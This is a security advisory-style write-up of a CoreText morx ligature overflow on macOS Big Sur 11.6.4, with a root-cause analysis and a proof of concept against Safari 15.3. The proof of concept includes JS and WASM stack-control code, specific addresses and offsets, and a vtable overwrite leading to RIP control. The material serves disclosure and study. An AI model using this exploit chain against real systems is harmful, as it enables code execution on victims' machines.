# macOS CoreText Heap Out-of-Bounds Write Vulnerability

**Tested Version:** macOS Big Sur 11.6.4

## Vulnerability

### Description

The extended glyph metamorphosis table (tag name: 'morx') in the Apple Advanced Typography (AAT) specification allows a font designer to specify a set of transformations that can apply to the glyphs of the font. There is a lack of bounds checking when processing the ligature subtable of the morx table, resulting in a stack-based buffer overflow. An attacker can lead the program down a certain code path, to achieve a out-of-bounds write on the heap, which may result in code execution.

### Details

According to the [AAT specs for morx table](https://developer.apple.com/fonts/TrueType-Reference-Manual/RM06/Chap6morx.html), a **ligature subtable** contains a series of **ligature actions**. Each **ligature action** is a 32-bit integer, specifying a set of information with the following bitmasks.

```
Mask value  Name    Interpretation
-----------------------------------
0x80000000	last	This is the last action in the list. This also implies storage.
0x40000000	store	Store the ligature at the current cumulated index in the ligature table in place of the marked (i.e. currently-popped) glyph.
0x3FFFFFFF	offset	A 30-bit value which is sign-extended to 32-bits and added to the glyph ID, resulting in an index into the component table.
```

The important thing here is the `last` mask. This bit is only set for the last action in the list.

In `TAATMorphSubtableMorx::DoLigatureAction`, there is a huge `while` loop, that is responsible for processing a list of **ligature actions**. It allocates an array of 128 `TGlyph` objects. In the case where the `store` bit is set, glyph information will be appended to this array.

However, this `while` loop only stops when a **ligature action** with the `last` bit set is processed. So, it is possible for the array of `TGlyph`s to be overflowed, by having more than 128 **ligature actions** with the `store` bit set, and `last` bit clear.

The following code snippet shows the relevant code that leads to the vulnerability.

```cpp
TAATMorphSubtableMorx::DoLigatureAction(..., MorxLigatureState state, ...)
{
  ...
  TGlyph tglyphs_storage[0x80];
  // end of stack frame (there's canary here)

  ...

  while(1)
  {
    // load ligature action from ligature action subtable
    p_ligature_action_entry = &lig_action_table[lig_action_index];
    ...
    // byteswap because font stores values in big endian
    // the -1 doesnt matter too much
    lig_action_entry = _byteswap_ulong(*(p_ligature_action_entry - 1));

    // load a TGlyph from state->tglyphs
    stack_top = state->stack_top;
    trunglue = state->tglyphs[stack_top].trunglue;
    location = state->tglyphs[stack_top].location;

    if (lig_action_entry >= 0x40000000)    // either Store or Last flag is set
    {
      // does some stuff to update the glyphs that will be shown to the user
      ...

      // then it appends the TGlyph to the local tglyphs array
      // no bounds check
      // remember tglyphs only has space for 0x80 elements
      tglyphs_storage[storage_index].trunglue = trunglue;
      tglyphs_storage[storage_index].location = location;
      ...

      storage_index++;
    }

    ...
  }
}
```

### Heap out-of-bounds write

On first glance, this vulnerability does not have much impact, because after overflowing the array of `TGlyph`s, the canary on the stack will be overwritten as well, causing a `SIGABRT` upon returning from the function.
However, it is possible to take a certain code path that leads to an OOB write on the heap.

First, one can provide a list of more than 278 **ligature actions** with the `store` bit set. This will overwrite values in the 2 earlier stack frames. Notably, the `MorxLigatureState` object from `TAATMorphSubtableMorx::ProcessT` (2 stack frames earlier) will be affected by the overflow, overwriting one of the fields to `0x7ffe`. I named this field as `stack_top` which is used as an index for a stack/array of `TGlyph`s, also stored in the `MorxLigatureState` object. As each `TGlyph` holds `0x10` bytes, an index of `0x7ffe` means accessing at offset `0x7ffe0`.

The relevant code snippet is attached below:

```cpp
    // load a TGlyph from state->tglyphs
    stack_top = state->stack_top;
    trunglue = state->tglyphs[stack_top].trunglue;
    location = state->tglyphs[stack_top].location;

    ...

    // update state->stack_top
    state->stack_top--;
    if ( state->stack_top < 0 )    // wrap around to other end of stack
      state->stack_top = *state->max_stack_size;
```

As shown in the code snippet above, 2 8-byte values are read from the stack, namely `trunglue` and `location`.

#### Control values at index 0x7ffe

Under typical circumstances, this will cause the process to crash, because offset `0x7ffe0` will likely point pass the end of the stack to unmapped memory. However, more could be done when this bug is used in a Safari tab process.

With nested JS function calls, each JS function will have 1 stack frame. Having 4556 JS functions before entering the vulnerable code will allocate enough stack frames, so offset `0x7ffe0` will point to a valid memory location, with contents controlled by the attacker.

The following code snippet shows the nested JS function calls mentioned:

```js
function f1() {f2()}
function f2() {f3()}
/* ... */
function f4555() {f4556()}
function f4556() {poc()}

function poc() { /* trigger vulnerable code */ }
```

And the stack could be visualized as follows:

```
+-------------------+
|  state->tglyphs   |
+-------------------+
|     .....         |
+-------------------+
| f4456 stack frame |
+-------------------+
| f4445 stack frame |
+-------------------+
|     .....         |
+-------------------+
|  f2 stack frame   |
+-------------------+
|  f1 stack frame   |  -- offset +0x7ffe0
+-------------------+
```

In order to deal more damage, the attacker would need to fully control the values accessed via `state->tglyphs[stack_top]` where `stack_top = 0x7ffe` as mentioned above.
By calling a function with an array as argument, the array contents will be pushed onto the stack, allowing `state->tglyphs` to read those values.
For example, in the code below, values `100`, `1337`, `31337` will be on `f1`'s stack frame.

```js
function f1(arr) {}
f1([100, 1337, 31337])
```

However, due to pointer tagging/NaN-boxing, integers are stored as 32-bit values, and are represented in the form `FFFE:0000:IIII:IIII` where `IIII:IIII` is the integer value.
This is far from ideal for exploitation.

Instead, an attacker could create a WASM module, with a function that takes an array of 64-bit values as argument. The array contents will not be stored in the NaN-boxed representation, but in its full 64-bit representation as declared. The following code example shows how this can be done.

```js
/* Utilities to store 64-bit values in an ArrayBuffer */
let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function () {
    return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function () {
    int_view[0] = this;
    return float_view[0];
}
Number.prototype.f2i = function () {
    float_view[0] = this;
    return int_view[0];
}
```

```js
/* Code to put values on the stack */
function poc() { /* Trigger vulnerability */ }

// Memory for the wasm module, initial size of 256 pages should be more than enough
var memory = new WebAssembly.Memory({ initial: 256 })
const importObject = {
    env: {
        poc: poc,
        memory: memory,
        memoryBase: 0,
    }
};

// The values to be placed onto the stack
const array = new Float64Array(memory.buffer, 0, 100)
array.set([
    BigInt("0x1337133713371337").i2f(),
    BigInt("0x00007fff8e200398").i2f(),
])

// Call the wasm function
WebAssembly.instantiateStreaming(
    fetch('main.wasm'),
    importObject
).then(result => {
    const { setup } = result.instance.exports
    setup(array.byteOffset)
});
```

```cpp
typedef unsigned long long ull;

extern "C"
{
  // Defined in JS to trigger the vulnerability
  extern void poc();

  // Put the array contents onto the stack. Called by JS.
  int setup(ull *args)
  {
    ull v0 = args[0];
    ull v1 = args[1];
    ull v2 = args[2];

    // Time to trigger the vulnerability
    poc();

    return v0 + v1 + v2;
  }
}
```

With the minimalistic setup shown above, the values `0x1337133713371337` and `0x00007fff8e200398` will be present on the stack.
More values would need to be pushed onto the stack to align with the index of `0x7ffe`. Please refer to the attached poc.html for more details.

#### OOB write code path

As mentioned earlier, the overflow occurs in a `while` loop. Once the loop is exited, the function will return, and will trigger a `SIGABRT` due to an overwritten canary.

However, the attacker can stay in the loop as long as he wants. In each iteration of the loop, the following code path will be taken:

* `TAATMorphSubtableMorx::DoLigatureAction<TRunGlue::TGlyph>(TRunGlue&,unsigned short,TAATMorphSubtableMorx::MorxLigatureState *,MorphActionResultCode &)::{lambda(void)#1}::operator()`
  * `TGlyphIterator::DoLigature`
    * `TRunGlue::SetGlyphID<true>`
      * `TStorageRange::SetGlyphID`
        * `objc_msgSend_ptr` - which calls `[_CTNativeGlyphStorage setGlyph:atIndex:]`

The definition of `[_CTNativeGlyphStorage setGlyph:atIndex:]` is as follows:

```cpp
_WORD *__fastcall -[_CTNativeGlyphStorage setGlyph:atIndex:](
        __int64 this,
        __int64 a2,
        __int16 ligature,
        __int64 index)
{
  _WORD *glyphs;

  glyphs = this->glyphs;
  glyphs[index] = ligature;              // oob write
  return glyphs;
}
```

Through the code path taken, there are no bounds checks for `index`, allowing for an out-of-bounds write on the heap.

Recall that 2 8-byte values are read from the stack in each iteration.

```cpp
    // load a TGlyph from state->tglyphs
    stack_top = state->stack_top;
    trunglue = state->tglyphs[stack_top].trunglue;
    location = state->tglyphs[stack_top].location;
```

Here in `[_CTNativeGlyphStorage setGlyph:atIndex:]`, `index` is equal to `location` (taken from the stack) added with some small offset (often 0 or 1). We have seen how an attacker can control this value earlier.
On the other hand, `ligature` is a value taken from the TTF file (in the attached poc.ttf, it is at offset `0x3D724` onwards).

##### Ligature value

Here is a short description of how `ligature` is taken from the **ligature list** table in the TTF file. In summary, this is what happens:

1. Obtain **component table** index from the ligature action (the least significant 30 bits of the **ligature action**).
2. Do bounds check on the **component table** index.
3. Read the **component value** from the **component table** and accumulate with previous iterations.
4. Do bounds check on the **ligature offset table**.
5. Read **ligature offset** from the font file.

```cpp
      // [1] obtain component table index from the ligature action
      component_index = ((4 * lig_action_entry) >> 2) + TRunGlue::GetGlyphID(trunglue, location);  // lig action offset
      p_component_entry = &component_table[component_index];

      // [2] bounds check on component index
      if ( this->ligature_subtable_start > p_component_entry )
        break;
      if ( this->ligature_subtable_end < &component_table[component_index + 1] )
        break;

      // [3] Accumulate
      component_entry += __ROL2__(*p_component_entry, 8);
      ...

      // if store bit is set (which is always the case in the POC)
      if ( lig_action_entry >= 0x40000000 )
      {
        p_ligature_list_entry = &ligature_list_table[component_entry];
        component_entry = 0;

        // [4] bounds check on ligature list table
        if ( this->ligature_subtable_start > p_ligature_list_entry
          || this->ligature_subtable_end < &ligature_list_table[component_entry + 1] )
        {
          break;
        }

        ...

        // [5] ligature retrieved from the font file
        ligature = __ROL2__(*p_ligature_list_entry, 8);

        ...
```

In the TTF file, I filled an area of the morx table with `\x01` bytes (starting from offset `0x3D4E0`).
The **ligature actions** have been chosen to ensure that the **component table** index always result in reading `0x1` as the **component value**.
As a result, the **ligature list table** index will be incremented by just 1 in every iteration.
So, the `ligature` value for `[_CTNativeGlyphStorage setGlyph:atIndex:]` is made taken sequentially from the **ligature list table**.

At the point where `location` begins to be attacker-controlled, which is after processing 278 **ligature actions**, the **ligature list table** index would be pointing to offset `0x3D724` in the TTF file.
In other words, for the OOB write, the attacker would place the values to write in the TTF file from offset `0x3D724` onwards.

To summarize, now the attacker is able to do an out-of-bounds write on the heap.

### Proof of Concept

This POC is tested on **Safari Version 15.3 (16612.4.9.1.8, 16612)**.

The POC consists of 3 files:
1. poc.html (to trigger the vulnerable code)
2. poc.ttf
3. main.wasm (to control values on the stack)

At the end of poc.html, the following `trunglue` and `location` values are placed onto the stack.

```js
...
array.set([
    ...
    BigInt("0xfffffffffffffdd8").i2f(),     // location 1
    BigInt("0x00007fff8e4002b8").i2f(),     // trunglue 1
    BigInt("18").i2f(),                     // location 2
    BigInt("0x00007fff8e4002b8").i2f(),     // trunglue 2
    ...
])
...
```

#### Valid `TRunGlue*`

There are a few constraints that `trunglue` needs to meet, i.e. `trunglue->glyphs[trunglue->run_index + location]` must be a valid access so that the process does not crash.

* `trunglue->run_index` (`*trunglue + 0xa0`) should ideally be small, as close to 0 as possible.
* `trunglue->glyphs` (`*trunglue + 0xb0`) must be a mapped address.
* For each `location` value needed in the exploit, make sure that `trunglue->glyphs[trunglue->run_index + location]` is as small as possible:
  * Because it is used to determine the index for the component table.
  * If the index goes out of bounds of the **morx ligature subtable** then the `while` loop will `break`.

If the attacker has an address leak, then it should be simple to point to a custom trunglue structure somewhere that satisfies these constraints.
In the attached POC, `trunglue` is set to point to somewhere in the `/usr/lib/libobjc.A.dylib`'s `__OBJC_RW` section that satisfies the constraints.
This works because the base address for this section is always constant, even after a reboot.

#### Ligature list table

In poc.ttf, the OOB write value will be taken from offset `0x3D724` onwards, 2-bytes in each iteration. The following shows that `0x0400` will be the write value.
In this POC, this value is arbitrary.

```
$ xxd poc.ttf | grep 3d720
0003d720: 00a5 00a6 0400 01d8 8e20 7fff cafe 00ac  ......... ......
```

#### vtable overwrite

Within the loop, besides the OOB write primitive, there is also the following code path that ends with a vtable call:

1. `TAATMorphSubtableMorx::DoLigatureAction<TRunGlue::TGlyph>(TRunGlue&,unsigned short,TAATMorphSubtableMorx::MorxLigatureState *,MorphActionResultCode &)::{lambda(void)#1}::operator()`
2. `TGlyphIterator::DoLigature`
3. `TRunGlue::SetGlyphID<true>`
4. `TStorageRange::ResetAdvance(TStorageRange*, oob offset, TFont*)`
5. `TFont::GetUnsummedAdvancesForGlyphs`
6. `GetUnscaledAdvances`
7. `tfont->in_memory_base_font->vtable + 0x208` vtable call

This POC overwrites the `tfont->in_memory_base_font` value in the heap, so that it points to a different memory location for the vtable access, resulting in control over `RIP` when the vtable call happens.

Through some experimentation, `-0x5b0` is usually the offset of `tfont` from the OOB write base, and `tfont->in_memory_base_font` would be at offset `-0x5b0+0x160`.
Because the OOB write is done on a `WORD` array, the OOB write index will be multiplied by 2 to be used as the OOB write offset.
And recall that there is a small offset (in this case, `1`) added to `location` before being used as the OOB index.
Considering all these, the `location` should be `(-0x5b0+0x160)/2-1`.

Due to so many things happening in the heap, the offset `-0x5b0` does not work all the time, but should work 4 out of 5 times.

With all these in place, opening poc.html in Safari, with LLDB attached, one should see the tab process crash due to 1 of the following reasons:
1. `EXC_BAD_ACCESS (code=EXC_I386_GPFLT)` because the `tfont->in_memory_base_font->vtable` points to an unmapped address.
2. `EXC_BAD_ACCESS (code=1, ...` because the `tfont->in_memory_base_font->vtable` points to a valid address, and `RIP` is set to `*(tfont->in_memory_base_font->vtable + 0x208)`.

If an attacker has an address leak, and/or sprays the heap with suitable objects, then a reliable exploit could be written to fully control `RIP` and gain arbitrary code execution.

#### small delay

One last small thing to take note. The `location` is not immediately given to the OOB write after loading it from the stack.
Here's what I mean. Suppose the following:

* `A` is `location = morx_ligature_state->tglyphs[stack_top].location`
* `B` is lambda function --> ... --> `[_CTNativeGlyphStorage setGlyph:atIndex:]` --> `glyphs[index] = ligature`

1. `A` loads `location1`
2. `B` uses `location0`
3. `A` loads `location2`
4. `B` uses `location1`
5. `A` loads `location3`
6. `B` uses `location2`
